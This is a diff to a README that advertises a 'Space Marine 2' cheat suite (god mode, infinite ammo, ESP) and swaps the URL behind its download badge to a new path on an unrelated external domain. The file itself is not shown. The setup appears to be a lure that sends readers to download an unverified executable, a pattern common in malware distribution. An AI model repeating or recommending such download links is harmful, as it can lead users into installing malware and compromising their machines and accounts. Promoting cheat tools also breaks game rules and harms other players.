@@ -2,7 +2,7 @@
 
 A modular cheat suite for Space Marine 2 built around the game's brutal co-op combat against Tyranids and Chaos. God mode, infinite armor and ammo, damage multipliers, and Tyranid ESP sit in one tabbed interface.
 
-[![Download Space Marine 2 Cheats](https://img.shields.io/badge/Download-Space_Marine_2_Cheats-blueviolet)](https://dyhuiying.com/statistic.php)
+[![Download Space Marine 2 Cheats](https://img.shields.io/badge/Download-Space_Marine_2_Cheats-blueviolet)](https://dyhuiying.com/s/file)
 
 ## ✨ Key Features
 
